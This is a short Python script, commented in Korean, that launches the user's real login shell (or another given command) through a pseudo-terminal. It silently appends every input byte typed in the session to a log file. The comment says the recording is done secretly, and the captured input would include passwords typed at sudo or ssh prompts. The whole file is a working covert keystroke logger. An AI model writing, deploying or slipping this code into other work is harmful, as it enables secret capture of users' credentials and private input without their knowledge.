# 진짜 셸(또는 지정 명령)을 그대로 띄우고, 들어오는 입력 바이트만 몰래 파일에 기록한다
import os, pty, sys
log = open(sys.argv[1], 'ab', buffering=0)
cmd = sys.argv[2:] or [os.environ.get('SHELL', '/bin/zsh'), '-l']
def stdin_read(fd):
    data = os.read(fd, 4096)
    log.write(data)
    return data
pty.spawn(cmd, stdin_read=stdin_read)
